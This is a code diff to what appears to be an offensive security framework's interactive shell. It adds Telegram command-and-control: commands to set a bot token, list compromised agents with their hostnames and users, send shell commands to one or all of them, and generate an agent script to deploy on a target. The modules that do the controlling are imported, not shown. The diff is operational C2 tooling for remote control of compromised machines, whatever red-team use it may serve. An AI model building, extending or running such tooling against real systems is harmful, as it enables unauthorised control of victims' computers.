@@ -355,7 +355,17 @@ this listener, giving you a command shell on the target.
       c2 mythic task <id> <cmd>    Task Mythic agent
 
       -- Advanced --
-      c2 pivot <agent_id> <port>   Create pivot listener through an agent"""
+      c2 pivot <agent_id> <port>   Create pivot listener through an agent
+
+      -- Telegram C2 --
+      c2 telegram config <token>   Set Telegram bot token
+      c2 telegram start            Start Telegram C2 polling
+      c2 telegram stop             Stop Telegram C2
+      c2 telegram list             List Telegram agents
+      c2 telegram task <id> <cmd>  Task an agent via Telegram
+      c2 telegram broadcast <cmd>  Send command to all agents
+      c2 telegram status           Telegram C2 status
+      c2 telegram agent            Generate agent script for deployment"""
         from core.c2 import C2Server, MythicClient
 
         args = arg.strip().split()
@@ -486,6 +496,67 @@ this listener, giving you a command shell on the target.
                 print(f"{Colors.YELLOW}[!] Mythic commands: connect, status, callbacks, task{Colors.RESET}")
             return
 
+        # ── Telegram C2 ──
+        if cmd == "telegram" and len(args) >= 2:
+            from core.c2_telegram import TelegramC2, generate_telegram_agent
+            tg = TelegramC2()
+
+            sub = args[1]
+            if sub == "config" and len(args) >= 3:
+                tg.configure(args[2])
+                print(f"{Colors.GREEN}[+] Telegram bot token configured{Colors.RESET}")
+            elif sub == "start":
+                result = tg.start()
+                if result["success"]:
+                    print(f"{Colors.GREEN}[+] {result['message']}{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[-] {result['error']}{Colors.RESET}")
+            elif sub == "stop":
+                tg.stop()
+                print(f"{Colors.YELLOW}[!] Telegram C2 stopped{Colors.RESET}")
+            elif sub == "list":
+                agents = tg.get_agents()
+                if not agents:
+                    print(f"{Colors.YELLOW}[!] No Telegram agents registered{Colors.RESET}")
+                else:
+                    print(f"\n{Colors.BOLD}Telegram Agents:{Colors.RESET}")
+                    for a in agents:
+                        status_color = Colors.GREEN if not a['dead'] else Colors.RED
+                        print(f"  {a['chat_id']:<15} {a['username']:<20} {a['hostname']:<20} {a['os']:<10} {status_color}{'active' if not a['dead'] else 'dead'}{Colors.RESET}")
+            elif sub == "task" and len(args) >= 4:
+                try:
+                    chat_id = int(args[2])
+                    command = " ".join(args[3:])
+                    result = tg.task_agent(chat_id, command)
+                    if result["success"]:
+                        print(f"{Colors.GREEN}[+] {result['message']}{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}[-] {result['error']}{Colors.RESET}")
+                except ValueError:
+                    print(f"{Colors.RED}[-] Invalid chat ID. Must be a number.{Colors.RESET}")
+            elif sub == "broadcast" and len(args) >= 3:
+                command = " ".join(args[2:])
+                result = tg.broadcast(command)
+                print(f"{Colors.GREEN}[+] {result['message']}{Colors.RESET}")
+            elif sub == "status":
+                s = tg.status()
+                print(f"\n{Colors.BOLD}Telegram C2 Status{Colors.RESET}")
+                print(f"  Running:        {Colors.GREEN}Yes{Colors.RESET}" if s['running'] else f"  Running:        {Colors.RED}No{Colors.RESET}")
+                print(f"  Bot Configured: {'Yes' if s['bot_configured'] else 'No'}")
+                print(f"  Agents:         {s['agents']}")
+                print(f"  Operator Chat:  {s['operator_chat_id'] or 'Not set'}")
+            elif sub == "agent":
+                if not tg.bot_token:
+                    print(f"{Colors.RED}[-] No bot token configured. Use 'c2 telegram config TOKEN' first.{Colors.RESET}")
+                else:
+                    path = generate_telegram_agent(tg.bot_token)
+                    print(f"{Colors.GREEN}[+] Telegram agent script generated: {path}{Colors.RESET}")
+                    print(f"{Colors.YELLOW}[!] Deploy this script on the target and run it.{Colors.RESET}")
+                    print(f"{Colors.YELLOW}[!] The target must have Python and internet access.{Colors.RESET}")
+            else:
+                print(f"{Colors.YELLOW}[!] Telegram commands: config, start, stop, list, task, broadcast, status, agent{Colors.RESET}")
+            return
+
         # ── Pivot listener ──
         if cmd == "pivot" and len(args) >= 3:
             result = c2.create_pivot_listener(f"pivot_{args[1]}", args[1], int(args[2]))
@@ -574,6 +645,11 @@ this listener, giving you a command shell on the target.
         print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop.{Colors.RESET}")
         _sys.argv = ["web_gui.py", "--port", str(port), "--host", host]
         gui_main()
+
+    def do_make_telegram_agent(self, arg):
+        """Generate a Telegram C2 agent script. Usage: make_telegram_agent"""
+        from core.telegram_agent import main as tg_main
+        tg_main()
 
     def do_update(self, arg):
         """Update everything: pull latest code from GitHub, then fetch CVEs.
